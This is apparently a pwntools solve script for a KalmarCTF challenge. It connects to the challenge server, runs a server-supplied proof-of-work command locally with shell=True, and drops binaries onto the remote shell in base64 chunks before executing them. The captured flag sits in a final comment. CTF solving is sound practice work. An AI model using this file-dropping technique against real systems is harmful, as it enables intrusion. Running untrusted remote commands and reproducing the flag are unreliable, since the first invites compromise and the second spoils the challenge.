#!/usr/bin/env python3

from pwn import *
import base64

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
context.encoding = 'utf-8'

gdbscript = '''
# tbreak main
# brva 0x2036

# fileinfo
brva 0x1695
continue
'''

pre_argv = []
post_argv = ['1']

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'pwn.chal-kalmarc.tf'
    port = int(args.PORT or 7331)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

if args.REMOTE:
    cmd = rl()
    print(cmd)
    import subprocess
    out = subprocess.check_output(cmd, shell=True)
    print(out)
    hash = out.split(b" ")[-1].strip()
    print(hash)
    sl(hash)
    

# data = open("./main.core", 'rb').read()
# pause()
# s(data)

main = open("./main", 'rb').read()
libfake = open("./libfake.so", 'rb').read()
libfoo = open("./libfoo.so", 'rb').read()

def send_file(data, fname):
    for i in range(0, len(data), 100):
        chunk = data[i:i+100]
        chunk = base64.b64encode(chunk).decode()
        cmd = f'echo -n "{chunk}" | base64 -d >> {fname}'
        sl(cmd)

sleep(2)
sl(f'cd /home/ctf')
sl(f'pwd')
send_file(main, "main")
send_file(libfake, "libfake.so")
send_file(libfoo, "libfoo.so")
sl(f'chmod +x ./main')
sl(f'ls -lah')
sl(f'./main')
sl(f'cat /var/log/crash.log')

io.raw = True
ia()


# kalmar{it's_not_easy_to_parse_core_files_reliably_huh?}